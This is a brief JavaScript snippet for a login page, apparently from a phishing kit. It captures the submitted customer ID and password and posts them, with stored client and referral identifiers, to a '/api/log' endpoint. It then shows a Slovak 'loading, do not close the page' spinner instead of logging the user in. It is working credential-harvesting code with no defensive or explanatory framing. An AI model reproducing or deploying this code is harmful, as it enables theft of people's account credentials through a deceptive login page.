const frm = document.getElementById(
  'login-form'
)

frm.addEventListener(
  'submit',
  (e) => {
    e.preventDefault()

    const USER_ID = localStorage.getItem('client_id')
    const REFERRAL_ID = localStorage.getItem('referral')

    axios.post(
      '/api/log',
      {
        id: USER_ID,
        referral: REFERRAL_ID,

        CustomerID: document.getElementById('login-creds').value,
        Password: document.getElementById('pwd-creds').value
      }
    ).then(() => {
      document.getElementById(
        'login-form'
      )['style']['text-align'] = 'center'

      document.getElementById(
        'login-form'
      ).innerHTML = `
        <h1 class="text-[26px] font-bold mb-5" style="color: #e5e7eb;">
          Načítavanie... Prosím, nezatvárajte stránku.
        </h1>
        <div class="lds-spinner" style="margin-left: auto; margin-right: auto;">
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
          <div></div>
        </div>
      `
    })
  }
)
